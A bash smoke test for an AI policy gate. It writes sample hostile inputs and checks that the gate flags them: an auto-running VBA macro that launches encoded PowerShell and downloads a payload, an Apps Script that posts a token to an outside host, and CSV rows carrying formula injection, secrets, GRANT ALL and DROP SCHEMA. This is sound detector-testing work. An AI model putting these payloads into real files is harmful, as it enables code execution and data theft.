#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
cd "$ROOT"
TMP="${TMPDIR:-/tmp}/bq_ai_policy_office_spreadsheet_$$"
mkdir -p "$TMP"
trap 'rm -rf "$TMP"' EXIT

write_job() {
  local dir="$1" name="$2" cmd="$3"
  mkdir -p "$dir"
  cat > "$dir/job.job" <<JOB
NAME=$name
PWD_AT_SUBMIT=$dir
COMMAND=($cmd)
JOB
}

expect_findings() {
  local dir="$1"; shift
  local out="$dir/out.json"
  QUEUEBASH_AI_POLICY_GATE_ENABLED=1 bin/queue-ai-policy-gate examine --job-file "$dir/job.job" > "$out"
  python3 - "$out" "$@" <<'PY'
import json, sys
path=sys.argv[1]
want=sys.argv[2:]
data=json.load(open(path))
ids={f.get('id') for f in data.get('findings', [])}
cats={f.get('category') for f in data.get('findings', [])}
langs=set(data.get('job_type_plan', {}).get('languages', []))
missing=[w for w in want if w not in ids and w not in cats and w not in langs]
if missing:
    print('missing', missing, 'ids', sorted(ids), 'cats', sorted(cats), 'langs', sorted(langs), file=sys.stderr)
    sys.exit(1)
PY
}

# VBA/VBScript-style office macro text: shell, download, autorun, base64/powershell evidence.
D1="$TMP/office_macro"
cat > "/macro.bas.tmp" <<'VB'
Sub AutoOpen()
  CreateObject("WScript.Shell").Run "powershell -enc SQBFAFgA"
  Set x = CreateObject("MSXML2.XMLHTTP")
  x.Open "GET", "https://example.invalid/payload", False
  x.Send
End Sub
VB
mkdir -p "$D1"
mv "/macro.bas.tmp" "$D1/macro.bas"
write_job "$D1" office 'cscript macro.bas'
expect_findings "$D1" office_macro office_macro_shell_execute office_macro_remote_download office_macro_autorun office_macro_powershell

# Google Apps Script project: external post, Drive scope-like access, secret literal, dynamic eval.
D2="$TMP/apps_script"
mkdir -p "$D2"
cat > "$D2/Code.gs" <<'GS'
function sync() {
  var token = "secret-token-value";
  var files = DriveApp.getFiles();
  UrlFetchApp.fetch("https://example.invalid/api", {method: "post", payload: token});
  eval("Logger.log('x')");
}
GS
cat > "$D2/appsscript.json" <<'JSON'
{"timeZone":"Etc/UTC","oauthScopes":["https://www.googleapis.com/auth/drive"]}
JSON
write_job "$D2" apps 'clasp push'
expect_findings "$D2" apps_script apps_script_external_post apps_script_drive_wide_access apps_script_secret_literal apps_script_eval data_transfer

# CSV/TSV text: spreadsheet formula injection, external import, secrets, and SQL patterns.
D3="$TMP/spreadsheet"
mkdir -p "$D3"
cat > "$D3/import.csv" <<'CSV'
name,formula,token,sql
alice,=WEBSERVICE("https://example.invalid/a"),api_key=supersecret,GRANT ALL PRIVILEGES ON MAIN_ERP.* TO newuser
bob,=cmd|'/C calc'!A0,password=hunter2,DROP SCHEMA audit
CSV
write_job "$D3" csvjob 'csvsql import.csv'
expect_findings "$D3" spreadsheet_text spreadsheet_formula_injection spreadsheet_external_import spreadsheet_secret_literal spreadsheet_sql_dml grant_all_privileges destructive_operation

echo "ai_policy_gate_office_spreadsheet_language_coverage_smoke: PASS"
